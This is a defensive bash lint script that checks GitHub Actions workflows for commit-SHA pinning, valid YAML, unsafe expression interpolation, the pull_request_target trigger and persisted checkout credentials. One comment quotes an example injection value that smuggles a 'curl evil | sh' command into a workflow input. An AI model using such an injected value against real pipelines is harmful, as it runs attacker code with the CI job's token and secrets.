#!/usr/bin/env bash
#
# Every GitHub Action must be pinned to a commit SHA.
#
# A tag is mutable. `actions/checkout@v4` can mean different code tomorrow than
# it does today, and the workflow that verifies this project's supply chain
# would be the least verified thing in it. This repository refuses a mutable
# image tag in an AgentManifest for exactly that reason; holding the line there
# and not here would be a position nobody could defend.
#
# The readable tag is kept in a trailing `# ratchet:` comment, so a reviewer can
# still see what version a SHA is meant to be. `make update-pins` re-resolves
# those comments to current SHAs.
#
# It also enforces three other workflow rules that are easy to get wrong once
# and then never notice: no expression interpolation inside a shell script, no
# `pull_request_target`, and no persisted checkout credentials.
#
#   ./hack/check-pins.sh
set -euo pipefail
cd "$(dirname "$0")/.."

fail=0
note() { printf '%s\n' "$1" >&2; fail=1; }

while IFS= read -r line; do
  file=${line%%:*}
  rest=${line#*:}
  lineno=${rest%%:*}
  ref=$(printf '%s' "$rest" | sed -n 's/.*uses:[[:space:]]*\([^[:space:]]*\).*/\1/p')

  # A local action is a path, not a reference, and has nothing to pin.
  case "$ref" in
    ./*|.) continue ;;
  esac

  version=${ref##*@}
  if ! printf '%s' "$version" | grep -qE '^[0-9a-f]{40}$'; then
    note "$file:$lineno: $ref is pinned to a tag, not a commit. A tag can be moved; run: make update-pins"
    continue
  fi
  if ! printf '%s' "$line" | grep -q '# ratchet:'; then
    note "$file:$lineno: $ref has no '# ratchet:<owner>/<repo>@<tag>' comment, so nobody can tell what version it is"
  fi
done < <(grep -rn 'uses:' .github/workflows/ 2>/dev/null || true)

# 1b. The workflow must actually parse.
#
# GitHub reports an unparseable workflow as a failed run named after the file,
# with no jobs and no log — which is a slow and confusing way to find out that a
# plain scalar cannot contain ": ". Catching it here costs nothing.
if python3 -c 'import yaml' 2>/dev/null; then
  for wf in .github/workflows/*.y*ml; do
    if ! python3 -c "import sys,yaml; yaml.safe_load(open(sys.argv[1]))" "$wf" 2>/dev/null; then
      msg=$(python3 -c "import sys,yaml
try:
    yaml.safe_load(open(sys.argv[1]))
except Exception as e:
    print(e)" "$wf" 2>&1 | head -2)
      note "$wf is not valid YAML, so GitHub will reject it: $msg"
    fi
  done
else
  echo "note: pyyaml is unavailable, so workflow syntax was not checked" >&2
fi

# 2. No ${{ }} inside a run: block.
#
# An expression is substituted textually before the shell ever sees the script,
# so a value an attacker controls becomes code. `${{ github.event.inputs.tag }}`
# in a run block will happily execute `x"; curl evil | sh; #`. The fix is always
# the same: pass it through `env:` and reference it as a shell variable, where
# it is data.
#
# This catches the whole class rather than the fields currently known to be
# attacker-controllable, because that list grows.
if ! python3 hack/lint-workflows.py; then
  fail=1
fi

# 3. No pull_request_target.
#
# It runs with a writable token and repository secrets, in the context of the
# base branch, on a pull request anybody can open. Combined with a checkout of
# the PR head it is a full repository takeover, and it is the single most
# common way public repositories get compromised. There is no use for it here.
hits=$(grep -rn 'pull_request_target' .github/workflows/ 2>/dev/null || true)
if [[ -n "$hits" ]]; then
  note "pull_request_target runs untrusted code with a writable token and secrets:"
  note "$hits"
fi

# 4. Checkout must not persist credentials.
#
# actions/checkout leaves the job token in .git/config by default, where every
# later step can read it — including anything a build dependency pulls in. No
# job here pushes, so no job here needs it.
missing=$(python3 - <<'PY_EOF'
import pathlib, re, sys
bad = []
for f in sorted(pathlib.Path(".github/workflows").glob("*.y*ml")):
    lines = f.read_text().split("\n")
    for i, line in enumerate(lines):
        if "uses:" not in line or "actions/checkout@" not in line:
            continue
        indent = len(line) - len(line.lstrip(" -"))
        block = []
        for nxt in lines[i + 1:]:
            if nxt.strip() and (len(nxt) - len(nxt.lstrip())) <= indent - 2:
                break
            block.append(nxt)
        if "persist-credentials: false" not in "\n".join(block):
            bad.append(f"{f}:{i + 1}: checkout keeps the job token in .git/config")
print("\n".join(bad))
PY_EOF
)
if [[ -n "$missing" ]]; then
  note "$missing"
fi

if [[ $fail -ne 0 ]]; then
  exit 1
fi
echo "workflow checks passed: pins, interpolation, triggers, credentials"
